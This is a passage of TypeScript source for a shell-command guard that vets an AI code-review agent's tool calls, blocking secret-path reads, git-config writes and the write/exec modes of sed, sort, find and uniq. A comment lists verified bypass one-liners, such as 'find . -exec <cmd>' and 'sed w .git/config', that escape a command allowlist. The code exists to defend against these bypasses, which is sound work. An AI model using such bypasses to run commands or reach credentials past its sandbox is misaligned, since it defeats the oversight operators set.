  const normalized = normalizeRedirections(cmd);
  const scriptCwd = scriptCwdForCommand(normalized, cwd, policy);
  // Checked over the WHOLE command, before the per-segment program check: the
  // programs that would read a root credential (cat, grep, jq…) are all
  // legitimately allowed, so the path is the only thing that distinguishes it.
  const secret = checkSecretPaths(normalized, { ...policy.secrets, cwd: cwd ?? process.cwd() });
  if (!secret.allowed) return secret;
  // Same reason again: `/proc/<pid>/environ` is read by `cat`.
  const proc = checkProcSecrets(normalized, cwd ?? process.cwd());
  if (!proc.allowed) return proc;
  // Same shape, same reason: a PROTECTED write surface
  // (`isProtectedWriteTarget`). A redirection target is not a program token,
  // so the per-segment walk below never sees it.
  const protectedWrite = checkProtectedWrites(normalized);
  if (!protectedWrite.allowed) return protectedWrite;
  for (const segment of splitShellSegments(normalized)) {
    const tokens = segment
      .trim()
      .split(/\s+/)
      .filter((t) => t.length > 0);
    if (tokens.length === 0) continue;
    const res = checkSegment(segment, tokens, depth, scriptCwd, policy);
    if (!res.allowed) return res;
  }
  return { allowed: true };
}

/**
 * The read-only programs that are not read-only.
 *
 * `sed`, `sort` and `find` are on ALLOWED because a reviewer greps and slices
 * text all day. Each also has a mode that WRITES A FILE or RUNS A COMMAND, and
 * a review session needs none of them. Without these rules, each of these
 * works (all VERIFIED):
 *
 *   sed -n 'w .git/config' payload            → wrote it; plain `git diff` then ran <cmd>
 *   sort -o .git/config payload               → same
 *   find . -maxdepth 0 -fprintf .git/config … → same
 *   find . -maxdepth 0 -exec <cmd> \;         → ran <cmd> DIRECTLY, no config involved
 *
 * The last is not a git-config bypass at all but arbitrary execution straight
 * through the program allowlist, so the exec-mode half of this rule is as
 * load-bearing as the write half.
 *
 * A blocked mode is a loud refusal on something a reviewer never legitimately
 * does; the failure modes are not symmetric.
 *
 * What it is NOT: the defence against the write class. A command-string rule
 * cannot see `T=.git/config; cat p >> $T`, and adding spellings here does not
 * close it. The class is closed by the round-boundary config-integrity check
 * (`src/execboundary.ts`), which needs no enumeration at all. This narrows the
 * surface; that catches what gets through.
 */
interface ReaderModeRule {
  /** Flags that write or execute, matched whole or as `--flag=value`. */
  flags: RegExp;
  what: string;
}

const READER_MODE_RULES: Readonly<Record<string, ReaderModeRule>> = {
  // -exec/-ok run a command; -delete removes files; the -fprint family writes
  // an arbitrary path (the `-fprintf` bypass above). find's primaries do not
  // cluster, so exact names are the right shape here.
  find: {
    flags: /^-(?:exec|execdir|ok|okdir|delete|fprintf|fprint|fprint0|fls)$/,
    what: "runs a command or writes a file",
  },
  // -o/--output writes; --compress-program names a program sort execs when it
  // spills to temp files (refused on documented behaviour, not on a probe —
  // sort does not spill on a small input).
  // `o` is unambiguous in sort's short-option set, so a cluster carrying it is
  // an output redirect.
  sort: {
    flags: /^(?:--(?:output|compress-program)(?:=|$)|-(?!-)[a-zA-Z]*o)/,
    what: "writes a file or names a program to run",
  },
  // sed is not here: `checkSedInvocation` parses it, which no pattern can match.
  // There is deliberately no `awk` entry: awk's exec and write forms take
  // arbitrary EXPRESSIONS (`print "cmd" | c`), so no rule here can gate it.
  // awk is off ALLOWED instead; see the comment there.
};

/**
 * sed, read as sed reads it. The regex rules above match spellings; sed's
 * script language is small enough to PARSE, so the decision is made on the
 * parse: every option is classified, every script is split into commands, and
 * the guard allows only an invocation whose every part it understood and none
 * of which writes, reads another file or runs a command. Fails closed: an
 * option it does not know, an abbreviation it cannot resolve to one safe
 * option, a script it cannot finish parsing, a script it cannot see (a
 * `$`-expansion or a backtick in an argument; `xargs`, which can append
 * options and scripts from stdin) are all refused.
 *
 * What it refuses inside a script: the `e`, `w`, `W`, `r` and `R` commands
 * (run a command, write a file, read a file into the stream), at any address
 * (`/re/`, `\cREc`, a number, `$`, `first~step`, `addr,+N`, negated with `!`);
 * and an `s` command whose flags carry `e` (run the pattern space as a
 * command) or `w` (write) — with ANY delimiter, flags in any order.
 */
export function checkSedInvocation(words: readonly string[]): string | null {
  const scripts: string[] = [];
  let positional: string | null = null;
  let explicit = false;
  // GNU getopt_long accepts any unambiguous prefix of a long option.
  const LONG: ReadonlyArray<[string, "script" | "value" | "flag" | "refuse"]> = [
    ["expression", "script"],
    ["file", "refuse"],
    ["in-place", "refuse"],
    ["line-length", "value"],
    ["null-data", "flag"],
    ["zero-terminated", "flag"],
    ["quiet", "flag"],
    ["silent", "flag"],
    ["regexp-extended", "flag"],
    ["separate", "flag"],
    ["sandbox", "flag"],
    ["debug", "flag"],
    ["posix", "flag"],
    ["unbuffered", "flag"],
    ["follow-symlinks", "flag"],
    ["binary", "flag"],
    ["help", "flag"],
    ["version", "flag"],
  ];
  for (let i = 0; i < words.length; i++) {
    const w = words[i]!;
    if (w === "--") {
      for (const rest of words.slice(i + 1))
        if (positional === null && !explicit) positional = rest;
      break;
    }
    if (w.startsWith("--")) {
      const [name, value] = w.slice(2).split(/=(.*)/s) as [string, string | undefined];
      const hits = LONG.filter(([n]) => n.startsWith(name));
      const exact = LONG.find(([n]) => n === name);
      const hit = exact ?? (hits.length === 1 ? hits[0] : undefined);
      if (name === "" || hit === undefined) return `an option the guard cannot classify ('${w}')`;
      const [full, kind] = hit;
      if (kind === "refuse")
        return `--${full}, which reads a script file or rewrites files in place`;
      if (kind === "script") {
        const script = value ?? words[++i];
        if (script === undefined) return `--${full} with no script`;
        scripts.push(script);
        explicit = true;
      } else if (kind === "value" && value === undefined) i++;
      continue;
    }
    if (w.startsWith("-") && w.length > 1) {
      for (let j = 1; j < w.length; j++) {
        const c = w[j]!;
        if ("nrEsuz".includes(c)) continue;
        if (c === "e" || c === "l") {
          const rest = w.slice(j + 1);
          const arg = rest.length > 0 ? rest : words[++i];
          if (arg === undefined) return `-${c} with no argument`;
          if (c === "e") {
            scripts.push(arg);
            explicit = true;
          }
          break;
        }
        if (c === "f" || c === "i")
          return `-${c}, which reads a script file or rewrites files in place`;
        return `an option the guard cannot classify (-${c})`;
      }
      continue;
    }
    if (!explicit && positional === null) positional = w;
  }
  if (!explicit) {
    if (positional === null) return null; // sed with no script: an error, not a risk
    scripts.push(positional);
  }
  for (const script of scripts) {
    const why = sedScriptDanger(script);
    if (why !== null) return why;
  }
  return null;
}

/** The first command in a sed script that writes, reads a file or runs a
 * command — or that the parser cannot classify — or null when every command
 * is a plain stream edit. */
export function sedScriptDanger(script: string): string | null {
  const s = script;
  let i = 0;
  const at = (k = i) => s[k] ?? "";
  const skipBlank = () => {
    while (i < s.length && /[ \t]/.test(at())) i++;
  };
  // A delimited part (`/re/`, `\cREc`, an s or y part): up to the next
  // unescaped delimiter. Brackets are not special here: a misread there only
  // moves where the flags are scanned from, and the flag scan runs to the end
  // of the command.
  const delimited = (d: string): boolean => {
    while (i < s.length) {
      const c = at();
      if (c === "\\") {
        i += 2;
        continue;
      }
      if (c === "\n" && d !== "\n") return false;
      i++;
      if (c === d) return true;
    }
    return false;
  };
  const address = (): boolean => {
    const c = at();
    if (/[0-9]/.test(c)) {
      while (/[0-9]/.test(at())) i++;
      if (at() === "~") {
        i++;
        while (/[0-9]/.test(at())) i++;
      }
      return true;
    }
    if (c === "$") {
      i++;
      return true;
    }
    if (c === "/" || c === "\\") {
      const d = c === "/" ? "/" : at(i + 1);
      i += c === "/" ? 1 : 2;
      if (d === "" || d === "\n" || !delimited(d)) return false;
      while (/[IM]/.test(at())) i++;
      return true;
    }
    return false;
  };
  while (i < s.length) {
    while (i < s.length && /[ \t\n;]/.test(at())) i++;
    if (i >= s.length) break;
    if (address()) {
      skipBlank();
      if (at() === ",") {
        i++;
        skipBlank();
        if (at() === "+" || at() === "~") {
          i++;
          while (/[0-9]/.test(at())) i++;
        } else if (!address()) return "an address the guard cannot read";
      }
    }
    skipBlank();
    while (at() === "!") {
      i++;
      skipBlank();
    }
    const cmd = at();
    i++;
    switch (cmd) {
      case "{":
      case "}":
      case "=":
      case "d":
      case "D":
      case "g":
      case "G":
      case "h":
      case "H":
      case "n":
      case "N":
      case "p":
      case "P":
      case "x":
      case "z":
      case "F":
        break;
      case "l":
      case "L":
      case "q":
      case "Q":
        skipBlank();
        while (/[0-9]/.test(at())) i++;
        break;
      case "#":
        // A comment runs to the end of the line.
        while (i < s.length && at() !== "\n") i++;
        break;
      case ":":
      case "b":
      case "t":
      case "T":
        // A label ends at whitespace, `;`, `}` or a newline, and what follows
        // is the NEXT command — GNU reads `bx e cmd` as a branch, then `e`.
        skipBlank();
        while (i < s.length && !/[\s;}]/.test(at())) i++;
        break;
      case "a":
      case "i":
      case "c":
        // Text to the end of the line, with backslash-newline continuations.
        while (i < s.length && at() !== "\n") i += at() === "\\" ? 2 : 1;
        break;
      case "y": {
        const d = at();
        i++;
        if (d === "" || d === "\\" || d === "\n" || !delimited(d) || !delimited(d))
          return "a y command the guard cannot read";
        break;
      }
      case "s": {
        const d = at();
        i++;
        if (d === "" || d === "\\" || d === "\n" || !delimited(d) || !delimited(d))
          return "an s command the guard cannot read";
        // The flags: everything up to the end of the command. GNU's flags are
        // g p N i I m M e w — `e` runs the pattern space as a command, `w`
        // writes a file.
        const start = i;
        while (i < s.length && !/[;\n}]/.test(at())) i++;
        const flags = s.slice(start, i);
        if (/[ew]/.test(flags)) return `an s command with an ${/e/.test(flags) ? "e" : "w"} flag`;
        break;
      }
      case "e":
      case "w":
      case "W":
      case "r":
      case "R":
        return `a ${cmd} command`;
      default:
        return `a command the guard cannot classify (${JSON.stringify(cmd)})`;
    }
  }
  return null;
}

/** `text` after its first `n` whitespace-separated words, verbatim — the same
 * words `checkBashCommand` splits a segment into. */
function textAfterWords(text: string, n: number): string {
  const word = /\S+/g;
  let end = 0;
  for (let k = 0; k < n; k++) {
    const m = word.exec(text);
    if (m === null) return "";
    end = m.index + m[0].length;
  }
  return text.slice(end);
}

/** Shell words of a sed invocation's argument text, as bash will hand them to
 * sed — or null when a word's value is not knowable from the text (a `$`
 * expansion, ANSI-C or locale quoting, a backtick, an unclosed quote). */
export function sedWords(text: string): string[] | null {
  const out: string[] = [];
  let cur = "";
  let inWord = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (c === "'") {
      const end = text.indexOf("'", i + 1);
      if (end < 0) return null;
      cur += text.slice(i + 1, end);
      i = end;
      inWord = true;
    } else if (c === '"') {
      i++;
      for (; i < text.length && text[i] !== '"'; i++) {
        const d = text[i]!;
        if (d === "$" || d === "`") return null;
        if (d === "\\" && /["\\$`\n]/.test(text[i + 1] ?? "")) cur += text[++i]!;
        else cur += d;
      }
      if (i >= text.length) return null;
      inWord = true;
    } else if (c === "\\") {
      if (text[i + 1] === "\n") {
        i++; // a line continuation joins, it adds nothing
        continue;
      }
      cur += text[++i] ?? "";
      inWord = true;
    } else if (c === "$" || c === "`") {
      return null;
    } else if (/\s/.test(c)) {
      if (inWord) out.push(cur);
      cur = "";
      inWord = false;
    } else {
      cur += c;
      inWord = true;
    }
  }
  if (inWord) out.push(cur);
  return out;
}

/**
 * Does this invocation of an allowlisted reader use one of its write/exec
 * modes? Exported so the reason is testable on its own.
 */
export function checkReaderModes(
  prog: string,
  args: readonly string[],
  rawArgs?: readonly string[],
  rawText?: string,
): BashCheck {
  if (prog === "sed") {
    // From the verbatim text when there is one: a newline inside a quoted
    // script ends an `a`/`i`/`c` text, a comment or a label, so re-joined
    // tokens would hide the command after it (`'1a x⏎e'`).
    const words =
      rawText !== undefined
        ? sedWords(rawText)
        : rawArgs !== undefined
          ? sedWords(rawArgs.join(" "))
          : [...args];
    const why =
      words === null
        ? "an argument the guard cannot read as words ($-expansion, $'…' quoting, a backtick, a quote cut by the command splitter)"
        : checkSedInvocation(words);
    if (why !== null) {
      return block(
        `exec policy: this 'sed' has ${why}, which writes a file or runs a command, or cannot be checked — the reviewer reads code and never writes or runs anything. Use 'sed -n' with plain p/s///g scripts.`,
      );
    }
    return { allowed: true };
  }
  const words = rawText === undefined ? args.map(dequote) : shellWords(rawText).words;
  if (
    ["find", "sort", "uniq"].includes(prog) &&
    (args.some(opensUnmodelledQuoting) ||
      (rawText !== undefined && opensUnmodelledQuoting(rawText)))
  ) {
    return block(`exec policy: '${prog}' has quoting the guard cannot decode`);
  }
  if (prog === "uniq") {
    let operands = 0;
    let options = true;
    for (let i = 0; i < words.length; i++) {
      const a = words[i]!;
      if (options && a === "--") {
        options = false;
        continue;
      }
      if (options && a.startsWith("-") && a !== "-") {
        if (/^-(?:f|s|w)$/.test(a) || /^--(?:skip-fields|skip-chars|check-chars)$/.test(a)) i++;
        continue;
      }
      operands++;
    }
    return operands > 1
      ? block(
          "exec policy: 'uniq' with an output operand writes a file — use only an input operand",
        )
      : { allowed: true };
  }
  const rule = READER_MODE_RULES[prog];
  if (rule === undefined) return { allowed: true };
  for (const a of words) {
    if (a.length > 0 && a.startsWith("-") && rule.flags.test(a)) {
      return block(
        `exec policy: '${prog} ${a}' ${rule.what} — the reviewer reads code and never writes or runs anything. Use the read-only form.`,
      );
    }
  }
  return { allowed: true };
}

/**
 * The write/edit tools' policy check. The write half of the two boundaries
 * `isProtectedWriteTarget` binds — the other is the shell redirection /
 * `sed -i` scan in `checkProtectedWrites`, and both read the same predicate so
 * a session cannot write through one what it is refused through the other.
 * Refuses git's config/hook surface, this system's own policy surface
 * (config.toml, scripts/, dist/, extensions/, prompts/agents/seeds, .pi/, the
 * pi context files) and the memory-scope files its recall reads (the recall
 * hint, the retired list); everything else a session writes — the verdict file,
 * the ledger, /tmp bodies — is allowed. This is not a write allowlist.
 */
export function checkWritePath(path: string): BashCheck {
  return isProtectedWriteTarget(path) ? protectedWriteBlock(path) : { allowed: true };
}

/** Tool names that take a file path and write it. Kept broad on purpose: a
 * name this list misses is a hole, and a name it carries that does not exist
 * costs nothing. // VERIFY-ON-PIN: pi's write-tool naming. */
const WRITE_TOOLS = new Set([
  "write",
  "edit",
  "multi_edit",
  "multiedit",
  "str_replace",
  "create",
  "write_file",
  "apply_patch",
]);

/** Tool names that take a file or directory path and READ it: pi's
 * built-in `read`, and its optional `grep`/`find`/`ls` (off by default — pi
 * 1.0.0 `DEFAULT_TOOL_NAMES` is read/bash/edit/write — but a settings layer
 * can switch them on). Broad for the same reason as WRITE_TOOLS.
 * // VERIFY-ON-PIN: pi's read-tool naming beyond the four built-ins. */
const READ_TOOLS = new Set(["read", "grep", "find", "ls", "read_file", "view", "cat"]);

/**
 * What one bash-guard needs, resolved: no env is read past this. Only these
 * three inputs are configurable. The policy itself (the program allowlist, the
 * secret-path and /proc rules, the protected write surfaces) is code in this
 * file, and the secrets dirs below are a FLOOR the guard adds the container's
 * own mount to; no profile layer (src/profileoverrides.ts) reaches either, and
 * the engine host builds this from the install, never from a profile (D13).
 */
export interface BashGuardConfig {
  /** The daemon-selected checkout that owns the sanctioned script bytes. */
  sandboxRoot: string;
  /** A regression replay session: no sandbox script is sanctioned at all. */
  replay: boolean;
  /** Every secrets dir this install could be using, absolute. The container
   * mount (`CONTAINER_SECRETS_DIR`) is always added. */
  secretDirs: readonly string[];
  /** HOME, XDG_CONFIG_HOME and QCR_INSTALL, the variables a secrets path is
   * spelled with in a command. Unset falls back to the defaults the env
   * shim's `defaultSecretPathContext` uses. */
  pathEnv?: Readonly<Record<string, string | undefined>>;
}

function policyFromConfig(config: BashGuardConfig): GuardPolicy {
  const dirs = new Set<string>([CONTAINER_SECRETS_DIR, ...config.secretDirs]);
  return {
    sandboxRoot: config.sandboxRoot,
    replay: config.replay,
    secrets: {
      env: config.pathEnv ?? {},
      dirs: [...dirs]
        .filter((d) => d.startsWith("/"))
        .map((d) => posix.normalize(d).replace(/(.)\/+$/, "$1")),
    },
  };
}

/** The config the env describes: QCR_SANDBOX_ROOT (else the cwd), QCR_REPLAY,
 * and the secrets dirs `defaultSecretPathContext` resolves from the same env. */
export function bashGuardConfigFromEnv(
  env: Readonly<Record<string, string | undefined>> = process.env,
  cwd: string = process.cwd(),
): BashGuardConfig {
  return {
    sandboxRoot: env.QCR_SANDBOX_ROOT ?? cwd,
    replay: env.QCR_REPLAY === "1",
    secretDirs: defaultSecretPathContext(env, cwd).dirs,
    pathEnv: {
      HOME: env.HOME,
      XDG_CONFIG_HOME: env.XDG_CONFIG_HOME,
      QCR_INSTALL: env.QCR_INSTALL,
    },
  };
}

/** The policy the process describes, read at each call: what the exported
 * pure checkers use when a caller passes none, so a test (or tool) that sets
 * QCR_SANDBOX_ROOT or QCR_REPLAY sees it at once. The secrets dirs are
 * resolved once, as they always were. */
function ambientPolicy(): GuardPolicy {
  const { cwd: _cwd, ...secrets } = processSecretContext();
  return {
    sandboxRoot: process.env.QCR_SANDBOX_ROOT ?? process.cwd(),
    replay: process.env.QCR_REPLAY === "1",
    secrets,
  };
}

/**
 * The factory a session loads: the guard over this config. Both hosts carry
 * the same object, a tmux pi through the default export below and an SDK
 * session as an extension factory. VERIFIED (pi control-surface findings §5):
 * a tool_call handler can return { block: true, reason } to veto the call, and
 * event.input is mutable. pi 1.3.0 emits `{ type: "tool_call", toolName,
 * toolCallId, input }` and its read/grep/find/ls tools take `path` (grep also
 * `glob`).
 * // VERIFY-ON-PIN: field names `toolName` and `input`/`arguments` on the event
 * payload, and (following extensions/companion-guard.ts, which already vetoes
 * writes this way) `path`/`file_path` on a file tool's input.
 */
export function createBashGuard(config: BashGuardConfig): ExtensionFactory {
  const policy = policyFromConfig(config);
  return (pi: ExtensionAPI): void => {
    pi.on("tool_call", (event, ctx) => {
      // `arguments` is not on pi 1.3.0's ToolCallEvent; the probe stays for a
      // pi that names the field that way (VERIFY-ON-PIN).
      const ev = event as ToolCallEvent & { arguments?: Record<string, unknown> };
      const input = (ev.input ?? ev.arguments) as
        | {
            command?: unknown;
            path?: unknown;
            file_path?: unknown;
            filePath?: unknown;
            glob?: unknown;
          }
        | undefined;
      // The session's own cwd: an SDK session shares its host's process.
      const cwd = typeof ctx?.cwd === "string" ? ctx.cwd : process.cwd();

      // The App-secret belt on every file tool, read AND write: an
      // `edit` that fails to match still answers with what it read.
      if (
        typeof ev.toolName === "string" &&
        (READ_TOOLS.has(ev.toolName) || WRITE_TOOLS.has(ev.toolName))
      ) {
        for (const p of [input?.path, input?.file_path, input?.filePath, input?.glob]) {
          if (typeof p !== "string") continue;
          const res = checkReadPath(p, { ...policy.secrets, cwd });
          if (!res.allowed)
            return { block: true, reason: res.reason ?? "exec policy: secret path blocked" };
        }
      }

      if (ev.toolName === "bash") {
        const cmd = input?.command;
        if (typeof cmd !== "string") return;
        const res = checkBashCommand(cmd, 0, cwd, policy);
        if (!res.allowed)
          return { block: true, reason: res.reason ?? "exec policy: command blocked" };
        return;
      }

      if (typeof ev.toolName === "string" && WRITE_TOOLS.has(ev.toolName)) {
        const target = input?.path ?? input?.file_path ?? input?.filePath;
        if (typeof target !== "string") return;
        const res = checkWritePath(target);
        if (!res.allowed)
          return { block: true, reason: res.reason ?? "exec policy: write blocked" };
      }
      return;
    });
  };
}

/** pi activation: the env shim. The env is read here, once, at activation. */
export default function activate(pi: ExtensionAPI): void {
  createBashGuard(bashGuardConfigFromEnv(process.env))(pi);
}
